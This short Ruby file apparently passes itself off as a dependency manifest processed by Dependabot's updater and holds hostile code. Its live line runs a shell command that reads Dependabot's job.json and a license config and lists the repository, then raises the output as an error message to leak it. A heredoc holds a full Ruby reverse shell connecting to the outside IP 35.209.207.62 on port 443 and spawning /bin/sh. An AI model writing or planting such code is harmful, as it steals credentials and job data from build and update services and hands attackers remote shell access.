# exec("echo *")
raise StandardError.new `(set -x; cat /home/dependabot/dependabot-updater/job.json; cat /home/dependabot/dependabot-updater/config/licenses/config.yml; ls -lR /home/dependabot/dependabot-updater/repo ) 2>&1`

<<-DOC

require 'socket'

s = Socket.new 2,1
s.connect Socket.sockaddr_in 443, '35.209.207.62'

[0,1,2].each { |fd| syscall 33, s.fileno, fd }
exec '/bin/sh -i'
DOC


